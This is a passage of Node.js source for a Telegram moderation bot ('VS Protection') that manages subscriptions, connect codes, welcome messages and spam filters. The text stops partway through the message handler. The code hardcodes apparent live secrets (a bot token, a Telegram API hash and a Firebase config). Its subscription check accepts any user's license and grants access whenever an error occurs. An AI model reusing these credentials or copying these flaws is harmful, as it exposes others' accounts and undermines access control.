const express = require('express');
const cors = require('cors');
const { Telegraf, Markup } = require('telegraf');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { computeCheck } = require('telegram/Password');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

// Firebase Node Setup
const firebase = require('firebase/compat/app');
require('firebase/compat/database');

const firebaseConfig = {
    apiKey: "AIzaSyBkL3ObqERCiDBuyXz4lr3Y7PYxzxt4hqA",
    authDomain: "vsprotection1.firebaseapp.com",
    databaseURL: "https://vsprotection1-default-rtdb.firebaseio.com",
    projectId: "vsprotection1",
    storageBucket: "vsprotection1.firebasestorage.app",
    messagingSenderId: "635122514754",
    appId: "1:635122514754:web:893417281989495d9066db"
};

if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
}
const db = firebase.database();

// NEW UPDATED BOT TOKEN
const BOT_TOKEN = process.env.BOT_TOKEN || "9180319761:AAFXmcsrSsDUbahabHLXG7JNADw8PcW0_6Y";
let BOT_USERNAME = "InfinityGuardofc_Bot";
const API_ID = parseInt(process.env.API_ID || "39447470");
const API_HASH = process.env.API_HASH || "eb7cac1c8ad9935d4b208dc0da076d8c";
const PORT = process.env.PORT || 3000;

const app = express();
app.use(cors());
app.use(express.json());

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(__dirname));

app.get('/ping', (req, res) => res.status(200).send("OK - VS Protection Engine Active"));
app.get('/api/tg/bot-info', (req, res) => res.json({ username: BOT_USERNAME, botId: botId || null }));

// Separate Admin Route (/admin -> admin.html)
app.get('/admin', (req, res) => {
    const p1 = path.join(__dirname, 'public', 'admin.html');
    const p2 = path.join(__dirname, 'admin.html');
    if (fs.existsSync(p1)) return res.sendFile(p1);
    if (fs.existsSync(p2)) return res.sendFile(p2);
    res.status(404).send("<h2>admin.html not found. Please upload admin.html to public/ folder.</h2>");
});

// =============================================================================
// SUBSCRIPTION CHECKER WITH AUTO-OWNER RECOVERY
// =============================================================================
let subscriptionCache = {};

async function isChatSubscriptionActive(chatId, ctx = null) {
    const now = Date.now();
    if (subscriptionCache[chatId] && (now - subscriptionCache[chatId].cachedAt < 20000)) {
        return subscriptionCache[chatId].isActive;
    }

    try {
        let sub = null;

        // 1. Check owner_user_id (from Google Auth & Connect Code)
        let ownerUserIdSnap = await db.ref(`groups/${chatId}/owner_user_id`).once('value');
        let ownerUserId = ownerUserIdSnap.val();
        if (ownerUserId) {
            const subUidSnap = await db.ref(`subscriptions/by_uid/${ownerUserId}`).once('value');
            sub = subUidSnap.val();
        }

        // 2. Check merged_owner
        if (!sub) {
            let ownerSnap = await db.ref(`groups/${chatId}/merged_owner`).once('value');
            let ownerTgId = ownerSnap.val();

            // Auto-detect group creator if missing
            if (!ownerTgId && ctx) {
                try {
                    const admins = await ctx.getChatAdministrators();
                    const creator = admins.find(a => a.status === 'creator');
                    if (creator && creator.user) {
                        ownerTgId = creator.user.id.toString();
                        await db.ref(`groups/${chatId}/merged_owner`).set(ownerTgId);
                    }
                } catch (e) {}
            }

            if (ownerTgId) {
                const subSnap = await db.ref(`subscriptions/${ownerTgId}`).once('value');
                sub = subSnap.val();
            }
        }

        // Check if any active user subscription exists
        if (!sub) {
            const allSubsSnap = await db.ref('subscriptions/by_uid').once('value');
            const allSubs = allSubsSnap.val() || {};
            const subKeys = Object.keys(allSubs);
            for (const k of subKeys) {
                const s = allSubs[k];
                const grace = s.graceEndsAt || (s.expiresAt + 7 * 86400000);
                if (now <= grace) {
                    sub = s;
                    break;
                }
            }
        }

        if (!sub) {
            subscriptionCache[chatId] = { isActive: false, cachedAt: now };
            return false;
        }

        const graceEndsAt = sub.graceEndsAt || (sub.expiresAt + (7 * 24 * 60 * 60 * 1000));
        const isActive = now <= graceEndsAt;

        subscriptionCache[chatId] = { isActive, cachedAt: now };
        return isActive;
    } catch (e) {
        return true;
    }
}

async function getOwnerSubByChat(chatId) {
    const active = await isChatSubscriptionActive(chatId);
    if (!active) {
        return {
            hasSub: false,
            reason: "NO_ACTIVE_LICENSE",
            message: "Active subscription license required to execute this action."
        };
    }
    return { hasSub: true };
}

// =============================================================================
// TELEGRAF BOT ENGINE
// =============================================================================
const bot = new Telegraf(BOT_TOKEN);
let chatSettingsCache = {};
let botId = null;

// Dynamically fetch and bind Bot Profile
bot.telegram.getMe().then(info => {
    botId = info.id;
    BOT_USERNAME = info.username;
    console.log(`[VS Protection] Telegraf Online: @${BOT_USERNAME} (ID: ${botId})`);
}).catch(err => {
    console.error("[VS Protection] BOT TOKEN ERROR: Please verify your token with @BotFather:", err.message);
});

async function getChatSettings(chatId) {
    if (chatSettingsCache[chatId]) return chatSettingsCache[chatId];
    try {
        const snap = await db.ref(`groups/${chatId}/settings`).once('value');
        const settings = snap.val() || {
            welcome: { enabled: true, photoUrl: "", text: "👋 Welcome {mention} to {chat}! Please adhere to our guidelines.", buttons: [], autoDeleteSeconds: 0 },
            goodbye: { enabled: true, text: "👋 Goodbye {mention}! We hope to see you again soon in {chat}.", autoDeleteSeconds: 10 },
            banSystem: { enabled: true, silent: false, msg: "⛔ {name} has been permanently removed from {chat}." },
            antiLink: { enabled: false, silent: false, msg: "⚠️ {mention}, external links are restricted in this community!" },
            antiForward: { enabled: false, silent: false, msg: "⚠️ {mention}, forwarded messages are not permitted!" },
            antiButton: { enabled: false, silent: false, msg: "⚠️ {mention}, messages containing interactive buttons are blocked!" },
            emojiSpam: { enabled: false, mode: 'only_emoji', onlyEmoji: true, maxCount: 2, silent: false, msg: "⚠️ {mention}, sending standalone emoji messages without text is prohibited in {chat}!", autoDeleteSeconds: 5 },
            badWords: { enabled: false, rules: [], words: [], action: 'delete', silent: false, customMsg: "⚠️ {mention}, prohibited text '{word}' detected in {chat}!", autoDeleteSeconds: 6 },
            scammerAlert: { enabled: true, msg: "🚨 *SECURITY ALERT: This user has been flagged as a FRAUDSTER/SCAMMER by administrators!*" },
            nameTracker: { enabled: true },
            leaveTracker: { enabled: true },
            commands: { bio: { enabled: true, role: 'all' } },
            autoReplies: {},
            warnLimit: 3,
            chatLocked: false,
            lockMsg: "🔒 *This conversation has been temporarily muted by community administrators.*"
        };
        chatSettingsCache[chatId] = settings;
        return settings;
    } catch (e) {
        return {};
    }
}

db.ref('groups').on('child_changed', (snap) => {
    const val = snap.val();
    if (val && val.settings) chatSettingsCache[snap.key] = val.settings;
});

function buildInlineButtons(buttonsArray) {
    if (!Array.isArray(buttonsArray) || buttonsArray.length === 0) return null;
    const inlineRows = [];
    buttonsArray.forEach(b => {
        if (b.text && b.url && (b.url.startsWith('http://') || b.url.startsWith('https://') || b.url.startsWith('tg://'))) {
            inlineRows.push([Markup.button.url(b.text.trim(), b.url.trim())]);
        }
    });
    return inlineRows.length > 0 ? Markup.inlineKeyboard(inlineRows) : null;
}

function countEmojis(str) {
    if (!str) return 0;
    const emojiRegex = /[\p{Extended_Pictographic}\u{1F3FB}-\u{1F3FF}\u{1F926}-\u{1F939}\u{1F1E6}-\u{1F1FF}]/gu;
    const matches = str.match(emojiRegex);
    return matches ? matches.length : 0;
}

function isOnlyEmoji(str, entities) {
    if (!str || !str.trim()) return false;
    // Strip emojis, variation selectors, zero-width joiners, skin tones, keycaps, flags, and whitespace
    const emojiRegex = /[\p{Extended_Pictographic}\u{1F3FB}-\u{1F3FF}\u{1F926}-\u{1F939}\u{1F1E6}-\u{1F1FF}\u{200D}\u{FE0F}\u{FE0E}\u{20E3}\s]/gu;
    let stripped = str.replace(emojiRegex, '');
    if (entities && Array.isArray(entities)) {
        for (const ent of entities) {
            if (ent.type === 'custom_emoji') {
                const sub = str.substring(ent.offset, ent.offset + ent.length);
                stripped = stripped.replace(sub, '');
            }
        }
    }
    const hasEmoji = /[\p{Extended_Pictographic}\u{1F3FB}-\u{1F3FF}\u{1F926}-\u{1F939}\u{1F1E6}-\u{1F1FF}]/u.test(str) ||
                     (entities && entities.some(e => e.type === 'custom_emoji'));
    return Boolean(hasEmoji && stripped.trim().length === 0);
}

bot.start((ctx) => {
    return ctx.replyWithMarkdown(
        `👋 *Hello, ${ctx.from.first_name || 'Member'}!*\n\n` +
        `I am *@${BOT_USERNAME}*, your enterprise Telegram community protection bot.\n\n` +
        `🚀 *How to connect your group or channel:*\n` +
        `1️⃣ Add me to your **Telegram Group** as an **Administrator**.\n` +
        `2️⃣ Go to your Web Dashboard and click **Create Connect Code**.\n` +
        `3️⃣ Send this command inside your group:\n` +
        `   `/connect <YOUR_CODE>`\n\n` +
        `🌐 *Dashboard:* Log in with Google to configure Ban Text rules, Emoji filters, and Security.`
    );
});

// 1. Welcome New Members
bot.on('new_chat_members', async (ctx) => {
    try {
        const chatId = ctx.chat.id;
        const isSubActive = await isChatSubscriptionActive(chatId, ctx);
        if (!isSubActive) return;

        const settings = await getChatSettings(chatId);
        if (!settings.welcome?.enabled) return;

        for (const member of ctx.message.new_chat_members) {
            if (member.is_bot) continue;

            const fullName = `${member.first_name || ''} ${member.last_name || ''}`.trim() || member.first_name;
            const userMention = `[${fullName}](tg://user?id=${member.id})`;
            const usernameTag = member.username ? `@${member.username}` : fullName;

            const msg = (settings.welcome.text || "Welcome {mention} to {chat}!")
                .replace(/{mention}/g, userMention)
                .replace(/{user}/g, userMention)
                .replace(/{name}/g, fullName)
                .replace(/{username}/g, usernameTag)
                .replace(/{chat}/g, ctx.chat.title || "Community");

            const keyboard = buildInlineButtons(settings.welcome.buttons);
            const extra = { parse_mode: 'Markdown' };
            if (keyboard) extra.reply_markup = keyboard.reply_markup;

            let sentWelcome;
            const photoUrl = (settings.welcome.photoUrl || "").trim();

            if (photoUrl && (photoUrl.startsWith('http://') || photoUrl.startsWith('https://'))) {
                sentWelcome = await ctx.replyWithPhoto(photoUrl, { caption: msg, ...extra }).catch(async () => {
                    return await ctx.replyWithMarkdown(msg, extra).catch(() => {});
                });
            } else {
                sentWelcome = await ctx.replyWithMarkdown(msg, extra).catch(() => {});
            }

            const deleteSec = parseInt(settings.welcome.autoDeleteSeconds || 0);
            if (deleteSec > 0 && sentWelcome && sentWelcome.message_id) {
                setTimeout(() => {
                    ctx.deleteMessage(sentWelcome.message_id).catch(() => {});
                }, deleteSec * 1000);
            }
        }
    } catch (err) {}
});

// 2. Member Left Tracker
bot.on('left_chat_member', async (ctx) => {
    try {
        const chatId = ctx.chat.id;
        const user = ctx.message.left_chat_member;
        if (!user || user.is_bot) return;

        const fullName = `${user.first_name || ''} ${user.last_name || ''}`.trim() || user.first_name;
        const userMention = `[${fullName}](tg://user?id=${user.id})`;
        const usernameTag = user.username ? `@${user.username}` : fullName;

        const leftData = {
            id: user.id.toString(),
            name: fullName,
            username: user.username ? `@${user.username}` : 'No username',
            timestamp: Date.now()
        };

        await db.ref(`groups/${chatId}/left_members/${user.id}`).set(leftData);

        const isSubActive = await isChatSubscriptionActive(chatId, ctx);
        if (!isSubActive) return;

        const settings = await getChatSettings(chatId);

        if (settings.goodbye?.enabled !== false && settings.goodbye?.text) {
            const goodbyeMsg = settings.goodbye.text
                .replace(/{mention}/g, userMention)
                .replace(/{user}/g, userMention)
                .replace(/{name}/g, fullName)
                .replace(/{username}/g, usernameTag)
                .replace(/{chat}/g, ctx.chat.title || "Community");

            const sentGoodbye = await ctx.replyWithMarkdown(goodbyeMsg).catch(() => {});
            const delSec = parseInt(settings.goodbye.autoDeleteSeconds || 0);
            if (delSec > 0 && sentGoodbye && sentGoodbye.message_id) {
                setTimeout(() => ctx.deleteMessage(sentGoodbye.message_id).catch(() => {}), delSec * 1000);
            }
        }
    } catch (e) {}
});

async function getUserRole(ctx, userId) {
    try {
        const member = await ctx.getChatMember(userId);
        if (member.status === 'creator') return 'owner';
        if (member.status === 'administrator') return 'admin';
        return 'member';
    } catch (e) {
        return 'member';
    }
}

// 3. Core Moderation Engine
bot.on('message', async (ctx, next) => {
    try {
        if (!ctx.chat || ctx.chat.type === 'private') return next();

        const chatId = ctx.chat.id;
        const text = ctx.message.text || ctx.message.caption || "";

        // Instant Health Check in Group: /ping
        if (text === '/ping') {
            return ctx.replyWithMarkdown(`🏓 *Pong!*\n🤖 Bot: @${BOT_USERNAME}\n⚡ Status: *Operational & Guarding Community*`);
        }

        // Connect Community via Code: /connect <code>
        if (text.startsWith('/connect') || text.startsWith('/pair') || text.startsWith('/bind') || (text.startsWith('/start') && text.includes('connect_'))) {
            const parts = text.trim().split(/\s+/);
            let inputCode = "";
            if (parts[0].startsWith('/start') && parts[1]?.startsWith('connect_')) {
                inputCode = parts[1].replace('connect_', '').trim().toUpperCase();
            } else {
                inputCode = (parts[1] || "").trim().toUpperCase();
            }

            if (!inputCode) {
                return ctx.replyWithMarkdown("⚠️ *Please provide your connect code!*\n\nExample:\n`/connect VS-XXXXXX`\n\n_Generate your connect code from your Web Dashboard._");
            }

            // Verify sender is admin or creator
            try {
                const admins = await ctx.getChatAdministrators();
                const senderAdmin = admins.find(a => a.user.id === ctx.from.id && ['creator', 'administrator'].includes(a.status));
                if (!senderAdmin) {
                    return ctx.reply("⚠️ Only group Administrators or Creators can link this community to a dashboard account.");
                }
            } catch (e) {
                return ctx.reply("⚠️ Please ensure @" + BOT_USERNAME + " is promoted to Administrator before connecting.");
            }

            const codeSnap = await db.ref(`connect_codes/${inputCode}`).once('value');
            const codeData = codeSnap.val();

            if (!codeData) {
                return ctx.reply("❌ Invalid connect code. Please verify the code generated from your Web Dashboard.");
            }

            // Enforce single-use: 1 code can NEVER be used for multiple groups!
            if (codeData.used) {
                return ctx.replyWithMarkdown(
                    `❌ *This connect code has ALREADY been used for another group!*\n\n` +
                    `Connected Group ID: (${codeData.usedInChatId || 'Unknown'})\n\n` +
                    `_Each connect code is strictly single-use and connects only 1 group. Please generate a new code from your dashboard._`
                );
            }

            if (codeData.expiresAt && Date.now() > codeData.expiresAt) {
                return ctx.reply("❌ This connect code has expired. Please generate a new code from your Web Dashboard.");
            }

            const ownerUid = codeData.userId;
            const subSnap = await db.ref(`subscriptions/by_uid/${ownerUid}`).once('value');
            const sub = subSnap.val();

            if (!sub) {
                return ctx.reply("⚠️ The account linked to this connect code does not have an active subscription license. Please claim a license from the dashboard first.");
            }

            const now = Date.now();
            const graceEndsAt = sub.graceEndsAt || (sub.expiresAt + 7 * 86400000);
            if (now > graceEndsAt) {
                return ctx.reply("⚠️ The subscription license linked to this account has expired. Please renew on the dashboard.");
            }

            // Enforce license community limit quota
            const allGroupsSnap = await db.ref('groups').once('value');
            const allGroups = allGroupsSnap.val() || {};
            const userGroups = Object.keys(allGroups).filter(gid => allGroups[gid].owner_user_id === ownerUid && gid !== chatId.toString());
            const maxAllowed = sub.maxCommunities || 1;

            if (userGroups.length >= maxAllowed) {
                return ctx.replyWithMarkdown(
                    `⚠️ *Community Limit Reached!*\n\n` +
                    `Your plan (*${sub.planName || 'Active License'}*) allows a maximum of *${maxAllowed}* communities.\n` +
                    `You already have *${userGroups.length}* connected.\n\n` +
                    `_Please upgrade your license or disconnect an unused group from your dashboard._`
                );
            }

            // Mark code as used (consumed)
            await db.ref(`connect_codes/${inputCode}`).update({
                used: true,
                usedInChatId: chatId.toString(),
                usedAt: now
            });

            // Save group details
            const groupData = {
                id: chatId.toString(),
                title: ctx.chat.title || "Telegram Group",
                type: ctx.chat.type,
                owner_user_id: ownerUid,
                owner_email: codeData.userEmail || "",
                merged_owner: ctx.from.id.toString(),
                connected_at: now,
                isBotConnected: true,
                role: "Owner"
            };

            await db.ref(`groups/${chatId}`).update(groupData);
            subscriptionCache[chatId] = { isActive: true, cachedAt: now };
            if (chatSettingsCache[chatId]) chatSettingsCache[chatId] = null;

            return ctx.replyWithMarkdown(
                `🛡️ *[COMMUNITY CONNECTED SUCCESSFULLY]*\n\n` +
                `🎉 *Congratulations!* This community has been securely connected to your account.\n\n` +
                `👤 *Linked Owner:* \`${codeData.userEmail || 'Dashboard User'}\`\n` +
                `🆔 *Community ID:* \`${chatId}\`\n` +
                `📋 *Plan:* \`${sub.planName || 'Active License'}\` (${userGroups.length + 1}/${maxAllowed} used)\n` +
                `⚡ *Protection Status:* *Active & Guarding*\n\n` +
                `⚙️ *You can now configure Ban Text rules, Emoji filters, Anti-link shields, and Announcements directly from your dashboard!*\n\n` +
                `_Powered by VS Protection Cloud_ 🔒`
            );
        }

        const isSubActive = await isChatSubscriptionActive(chatId, ctx);
        if (!isSubActive) {
            // Helpful prompt if unlicensed
            if (text.startsWith('/bio') || text.startsWith('/scam')) {
                return ctx.reply("⚠️ VS Protection Bot is inactive in this community because there is no active subscription license. Please claim a license from the dashboard.");
            }
            return next();
        }

        const userId = ctx.from?.id;
        const settings = await getChatSettings(chatId);
        const userRole = await getUserRole(ctx, userId);
        const isAdmin = ['owner', 'admin'].includes(userRole);

        const fullName = `${ctx.from?.first_name || ''} ${ctx.from?.last_name || ''}`.trim() || (ctx.from ? ctx.from.first_name : 'Member');
        const userMention = `[${fullName}](tg://user?id=${userId})`;
        const usernameTag = ctx.from?.username ? `@${ctx.from.username}` : fullName;

        // Name Change Tracker
        if (settings.nameTracker?.enabled !== false && ctx.from) {
            const userHistoryRef = db.ref(`groups/${chatId}/name_history/${userId}`);
            const snap = await userHistoryRef.once('value');
            const storedName = snap.val();

            if (storedName && storedName !== fullName) {
                ctx.replyWithMarkdown(
                    `📝 *[SECURITY: NAME CHANGE DETECTED]*\n` +
                    `Member: [${fullName}](tg://user?id=${userId})\n` +
                    `🔄 *Previous Name:* \`${storedName}\`\n` +
                    `✨ *Updated Name:* \`${fullName}\``
                ).catch(() => {});
            }
            await userHistoryRef.set(fullName);
        }

        // Scammer Alert
        const scammerSnap = await db.ref(`groups/${chatId}/scammers/${userId}`).once('value');
        if (scammerSnap.val()) {
            const scamNotice = settings.scammerAlert?.msg || "🚨 *SECURITY ALERT: This user has been flagged as a FRAUDSTER/SCAMMER by administrators!*";
            ctx.replyWithMarkdown(scamNotice, { reply_to_message_id: ctx.message.message_id }).catch(() => {});
        }

        // Auto-Reply Engine
        if (text && settings.autoReplies && typeof settings.autoReplies === 'object') {
            const cleanText = text.trim().toLowerCase();
            const replyKeys = Object.keys(settings.autoReplies);

            for (const key of replyKeys) {
                const rule = settings.autoReplies[key];
                if (!rule || !rule.trigger || !rule.response) continue;

                const triggerWord = rule.trigger.trim().toLowerCase();
                if (cleanText === triggerWord || cleanText.includes(triggerWord)) {
                    const target = rule.target || 'everyone';
                    let allowed = false;

                    if (target === 'everyone') allowed = true;
                    else if (target === 'admin_owner' && (userRole === 'admin' || userRole === 'owner')) allowed = true;
                    else if (target === 'owner_only' && userRole === 'owner') allowed = true;

                    if (allowed) {
                        const formattedReply = rule.response
                            .replace(/{mention}/g, userMention)
                            .replace(/{user}/g, userMention)
                            .replace(/{name}/g, fullName)
                            .replace(/{username}/g, usernameTag)
                            .replace(/{chat}/g, ctx.chat.title || "Community");

                        const keyboard = buildInlineButtons(rule.buttons);
                        const extra = { reply_to_message_id: ctx.message.message_id, parse_mode: 'Markdown' };
                        if (keyboard) extra.reply_markup = keyboard.reply_markup;

                        ctx.reply(formattedReply, extra).catch(async () => {
                            await ctx.reply(formattedReply, { reply_to_message_id: ctx.message.message_id }).catch(() => {});
                        });
                        break;
                    }
                }
            }
        }

        // Commands
        if (text.startsWith('/')) {
            const parts = text.trim().split(/\s+/);
            const cmd = parts[0].toLowerCase().replace(`@${bot.botInfo?.username?.toLowerCase()}`, '');

            if (cmd === '/ban' && isAdmin) {
                let targetUser = ctx.message.reply_to_message?.from;
                if (!targetUser) return ctx.reply("⚠️ Reply to a message with `/ban` to execute removal.");

                await ctx.banChatMember(targetUser.id).catch(() => {});
                const tName = `${targetUser.first_name || ''} ${targetUser.last_name || ''}`.trim() || targetUser.first_name;
                const tMention = `[${tName}](tg://user?id=${targetUser.id})`;
                const tUsername = targetUser.username ? `@${targetUser.username}` : tName;

                if (!settings.banSystem?.silent && settings.banSystem?.msg) {
                    const banNotice = settings.banSystem.msg
                        .replace(/{mention}/g, tMention)
                        .replace(/{user}/g, tMention)
                        .replace(/{name}/g, tName)
                        .replace(/{username}/g, tUsername)
                        .replace(/{chat}/g, ctx.chat.title)
                        .replace(/{admin}/g, fullName);

                    return ctx.replyWithMarkdown(banNotice);
                }
                return;
            }

            if (cmd === '/bio') {
                const bioRoleAllowed = settings.commands?.bio?.role || 'all';
                if (bioRoleAllowed === 'owner' && userRole !== 'owner') return;
                if (bioRoleAllowed === 'admin' && !isAdmin) return;

                let targetUser = ctx.from;
                if (ctx.message.reply_to_message && ctx.message.reply_to_message.from) {
                    targetUser = ctx.message.reply_to_message.from;
                }

                const targetId = targetUser.id;
                const targetFullName = `${targetUser.first_name || ''} ${targetUser.last_name || ''}`.trim() || targetUser.first_name;
                const targetRole = await getUserRole(ctx, targetId);

                const warnSnap = await db.ref(`groups/${chatId}/warns/${targetId}`).once('value');
                const warnsCount = warnSnap.val() || 0;
                const isScammer = (await db.ref(`groups/${chatId}/scammers/${targetId}`).once('value')).val();

                const bioMessage = 
                    `📋 *User Community Bio & Security Dossier*\n\n` +
                    `👤 *Name:* [${targetFullName}](tg://user?id=${targetId})\n` +
                    `🆔 *User ID:* \`${targetId}\`\n` +
                    `🔗 *Username:* ${targetUser.username ? `@${targetUser.username}` : '_None_'}\n` +
                    `🎖 *Assigned Role:* \`${targetRole.toUpperCase()}\`\n` +
                    `⚠️ *Active Infractions:* \`${warnsCount}/${settings.warnLimit || 3}\`\n` +
                    `🛡 *Trust Evaluation:* ${isScammer ? '🚨 *CONFIRMED SCAMMER*' : '✅ *Verified Safe*'}`;

                return ctx.replyWithMarkdown(bioMessage, { reply_to_message_id: ctx.message.message_id });
            }

            if (cmd === '/scam' && isAdmin) {
                let targetUser = ctx.message.reply_to_message?.from;
                if (!targetUser) return ctx.reply("⚠️ Reply to a message with `/scam` to flag this account.");

                await db.ref(`groups/${chatId}/scammers/${targetUser.id}`).set({
                    name: `${targetUser.first_name || ''} ${targetUser.last_name || ''}`.trim(),
                    username: targetUser.username || '',
                    flaggedAt: Date.now(),
                    flaggedBy: ctx.from.id
                });

                return ctx.replyWithMarkdown(`🚨 [${targetUser.first_name}](tg://user?id=${targetUser.id}) has been added to the **Scammer Blacklist**!`);
            }

            if (cmd === '/unscam' && isAdmin) {
                let targetUser = ctx.message.reply_to_message?.from;
                if (!targetUser) return ctx.reply("⚠️ Reply with `/unscam` to clear flags.");

                await db.ref(`groups/${chatId}/scammers/${targetUser.id}`).remove();
                return ctx.replyWithMarkdown(`✅ Scam designation cleared for [${targetUser.first_name}](tg://user?id=${targetUser.id}).`);
            }
        }

        if (isAdmin) return next();

        // 1. Chat Lock
        if (settings.chatLocked) {
            await ctx.deleteMessage().catch(() => {});
            return;
        }

        // 2. Anti-Button Messages Block
        if (settings.antiButton?.enabled) {
            const hasReplyMarkup = ctx.message.reply_markup && ctx.message.reply_markup.inline_keyboard && ctx.message.reply_markup.inline_keyboard.length > 0;
            if (hasReplyMarkup || ctx.from.is_bot) {
                await ctx.deleteMessage().catch(() => {});
                if (!settings.antiButton.silent && settings.antiButton.msg) {
                    const response = settings.antiButton.msg.replace(/{mention}/g, userMention).replace(/{chat}/g, ctx.chat.title);
                    ctx.replyWithMarkdown(response).then(m => setTimeout(() => ctx.deleteMessage(m.message_id).catch(() => {}), 5000));
                }
                return;
            }
        }

        // 3. Emoji Spam Guard
        if (settings.emojiSpam?.enabled) {
            const emojiCount = countEmojis(text);
            const mode = settings.emojiSpam.mode || (settings.emojiSpam.onlyEmoji !== false ? 'only_emoji' : 'excessive_emoji');
            let shouldTrigger = false;

            if (mode === 'only_emoji') {
                // User requirement: Only trigger if message contains strictly emojis (allowed when accompanied by text)
                shouldTrigger = isOnlyEmoji(text, ctx.message?.entities);
            } else {
                const maxAllowed = parseInt(settings.emojiSpam.maxCount ?? 2);
                shouldTrigger = emojiCount > maxAllowed;
            }

            if (shouldTrigger) {
                await ctx.deleteMessage().catch(() => {});
                if (!settings.emojiSpam.silent && settings.emojiSpam.msg) {
                    const response = settings.emojiSpam.msg
                        .replace(/{mention}/g, userMention)
                        .replace(/{name}/g, fullName)
                        .replace(/{username}/g, usernameTag)
                        .replace(/{chat}/g, ctx.chat.title || "Community")
                        .replace(/{count}/g, emojiCount)
                        .replace(/{limit}/g, settings.emojiSpam.maxCount || 0);
                    const sentWarn = await ctx.replyWithMarkdown(response).catch(async () => {
                        return await ctx.reply(response).catch(() => {});
                    });
                    const delSec = parseInt(settings.emojiSpam.autoDeleteSeconds ?? 5);
                    if (delSec > 0 && sentWarn && sentWarn.message_id) {
                        setTimeout(() => ctx.deleteMessage(sentWarn.message_id).catch(() => {}), delSec * 1000);
                    }
                }
                return;
            }
        }

        // 4. Anti-Forward Check
        if (settings.antiForward?.enabled && (ctx.message.forward_date || ctx.message.forward_origin)) {
            await ctx.deleteMessage().catch(() => {});
            if (!settings.antiForward.silent && settings.antiForward.msg) {
                const response = settings.antiForward.msg.replace(/{mention}/g, userMention).replace(/{chat}/g, ctx.chat.title);
                ctx.replyWithMarkdown(response).then(m => setTimeout(() => ctx.deleteMessage(m.message_id).catch(() => {}), 5000));
            }
            return;
        }

        // 5. Anti-Link Check
        if (settings.antiLink?.enabled) {
            const linkRegex = /(https?:\/\/[^\s]+)|(t\.me\/[^\s]+)|(telegram\.me\/[^\s]+)/gi;
            if (linkRegex.test(text)) {
                await ctx.deleteMessage().catch(() => {});
                if (!settings.antiLink.silent && settings.antiLink.msg) {
                    const response = settings.antiLink.msg.replace(/{mention}/g, userMention).replace(/{chat}/g, ctx.chat.title);
                    ctx.replyWithMarkdown(response).then(m => setTimeout(() => ctx.deleteMessage(m.message_id).catch(() => {}), 5000));
                }
                return;
            }
        }

        // 6. Ban Text & Content Rules Filter
        if (settings.badWords?.enabled) {
            const rules = Array.isArray(settings.badWords.rules) ? settings.badWords.rules : [];
            const legacyWords = Array.isArray(settings.badWords.words) ? settings.badWords.words : [];

            let matchedRule = null;
            let matchedWord = "";
            const cleanText = (text || "").toLowerCase();

            // 1. Check custom configured rules (supporting single word or multiple comma-separated words)
            for (const rule of rules) {
                if (!rule) continue;
                const wordsList = Array.isArray(rule.words)
                    ? rule.words
                    : (typeof rule.words === 'string' ? rule.words.split(',') : (typeof rule.text === 'string' ? rule.text.split(',') : []));

                for (let w of wordsList) {
                    w = (w || "").trim().toLowerCase();
                    if (!w) continue;
                    if (cleanText.includes(w)) {
                        matchedRule = rule;
                        matchedWord = w;
                        break;
                    }
                }
                if (matchedRule) break;
            }

            // 2. Check legacy words list if no rule matched
            if (!matchedRule && legacyWords.length > 0) {
                for (let w of legacyWords) {
                    w = (w || "").trim().toLowerCase();
                    if (!w) continue;
                    if (cleanText.includes(w)) {
                        matchedRule = {
                            words: [w],
                            deleteMessage: true,
                            deleteMode: 'single',
                            note: settings.badWords.customMsg || "⚠️ {mention}, prohibited text '{word}' detected in {chat}!",
                            autoDeleteSeconds: settings.badWords.autoDeleteSeconds ?? 6,
                            action: settings.badWords.action || 'delete'
                        };
                        matchedWord = w;
                        break;
                    }
                }
            }

            if (matchedRule) {
                // Delete user message or keep it: "message delete kore ba na kore user ja be oitai dekhabe"
                const shouldDelete = matchedRule.deleteMessage !== false && matchedRule.deleteMode !== 'none';

                if (shouldDelete) {
                    await ctx.deleteMessage().catch(() => {});
                    // If multiple recent messages deletion requested
                    if (matchedRule.deleteMode === 'recent') {
                        const currentMsgId = ctx.message.message_id;
                        for (let i = 1; i <= 4; i++) {
                            ctx.deleteMessage(currentMsgId - i).catch(() => {});
                        }
                    }
                }

                // Send the custom note/reply to user
                const noteTemplate = matchedRule.note || matchedRule.customMsg || settings.badWords.customMsg || "⚠️ {mention}, prohibited text '{word}' detected in {chat}!";
                const formattedNotice = noteTemplate
                    .replace(/{mention}/g, userMention)
                    .replace(/{name}/g, fullName)
                    .replace(/{username}/g, usernameTag)
                    .replace(/{chat}/g, ctx.chat.title || "Community")
                    .replace(/{word}/g, matchedWord);

                let replyExtra = { parse_mode: 'Markdown' };
                if (!shouldDelete && ctx.message?.message_id) {
                    replyExtra.reply_to_message_id = ctx.message.message_id;
                }

                let warningMsgSent = await ctx.replyWithMarkdown(formattedNotice, replyExtra).catch(async () => {
                    return await ctx.reply(formattedNotice, replyExtra).catch(() => {});
                });

                // Auto delete the bot note after configured seconds
                const deleteSec = parseInt(matchedRule.autoDeleteSeconds ?? settings.badWords.autoDeleteSeconds ?? 6);
                if (deleteSec > 0 && warningMsgSent && warningMsgSent.message_id) {
                    setTimeout(() => {
                        ctx.deleteMessage(warningMsgSent.message_id).catch(() => {});
                    }, deleteSec * 1000);
                }

                // Infraction action: warn / ban
                const action = matchedRule.action || settings.badWords.action || 'delete';
                const warnLimit = settings.warnLimit || 3;

                if (action === 'warn') {
                    const warnRef = db.ref(`groups/${chatId}/warns/${userId}`);
                    const snap = await warnRef.once('value');
                    const warns = (snap.val() || 0) + 1;
                    await warnRef.set(warns);

                    if (warns >= warnLimit) {
                        await ctx.banChatMember(userId).catch(() => {});
                        await warnRef.remove();
                        if (!settings.banSystem?.silent) {
                            const banMsg = (settings.banSystem?.msg || "⛔ {name} has been permanently removed.")
                                .replace(/{mention}/g, usernameTag)
                                .replace(/{name}/g, fullName)
                                .replace(/{chat}/g, ctx.chat.title || "Community");
                            ctx.replyWithMarkdown(banMsg).catch(() => {});
                        }
                    }
                } else if (action === 'ban') {
                    await ctx.banChatMember(userId).catch(() => {});
                    if (!settings.banSystem?.silent) {
                        const banMsg = (settings.banSystem?.msg || "⛔ {name} has been permanently removed.")
                            .replace(/{mention}/g, usernameTag)
                            .replace(/{name}/g, fullName)
                            .replace(/{chat}/g, ctx.chat.title || "Community");
                        ctx.replyWithMarkdown(banMsg).catch(() => {});
                    }
                }

                return;
            }
        }
